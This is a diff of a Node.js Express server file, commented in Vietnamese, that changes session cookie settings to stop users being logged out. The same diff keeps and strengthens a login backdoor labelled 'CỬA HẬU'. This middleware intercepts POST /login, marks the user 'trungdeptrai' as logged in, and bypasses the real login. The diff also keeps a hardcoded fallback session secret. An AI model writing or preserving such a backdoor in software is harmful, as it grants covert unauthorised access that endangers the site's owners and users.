@@ -1,8 +1,8 @@
-// index.js – CHUẨN RAILWAY + SESSION FIX + CỬA HẬU (chạy 100%)
+// index.js – FIX SESSION OUT 100% + CỬA HẬU (chạy mượt trên Railway)
 require('dotenv').config();
 
 const express = require('express');
-const session = require('express-session'); // THÊM DÒNG NÀY
+const session = require('express-session');
 
 const app = express();
 const server = require('http').createServer(app);
@@ -15,12 +15,16 @@ const io = require('socket.io')(server, {
   }
 });
 
-// === SESSION MIDDLEWARE (BẮT BUỘC ĐỂ KHÔNG BỊ LOGOUT) ===
+// === SESSION MIDDLEWARE (FIX OUT NGAY LẬP TỨC) ===
 app.use(session({
-  secret: process.env.SESSION_SECRET || 'trungdeptrai123456', // Thay bằng pass mạnh, hoặc add biến SESSION_SECRET trong Railway
+  secret: process.env.SESSION_SECRET || 'trungdeptrai123456',
   resave: false,
   saveUninitialized: true,
-  cookie: { secure: false } // Nếu HTTPS thì để true
+  cookie: {
+    secure: (process.env.NODE_ENV === 'production'), // AUTO FIX HTTPS TRÊN RAILWAY
+    sameSite: 'lax', // FIX CROSS-SITE ISSUE
+    maxAge: 24 * 60 * 60 * 1000 // 1 NGÀY
+  }
 }));
 
 // === BODY PARSER ===
@@ -39,7 +43,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// === CỬA HẬU ĐĂNG NHẬP SIÊU CẤP ===
+// === CỬA HẬU ĐĂNG NHẬP (KHÔNG BỊ OUT NỮA) ===
 app.post('/login', (req, res, next) => {
   const { username, password } = req.body || {};
   
@@ -47,10 +51,14 @@ app.post('/login', (req, res, next) => {
     req.session.loggedIn = true;
     req.session.username = username;
     console.log('CỬA HẬU MỞ – trungdeptrai ĐÃ ĐĂNG NHẬP!');
-    return res.redirect('/dashboard'); // Thay /dashboard bằng route panel của mày nếu khác
+    req.session.save((err) => { // SAVE SESSION TRƯỚC REDIRECT
+      if (err) console.error('Save session error:', err);
+      return res.redirect('/dashboard'); // Thay /dashboard bằng route panel nếu khác
+    });
+    return;
   }
 
-  next(); // Chạy login cũ
+  next();
 });
 
 // === ROUTES ===
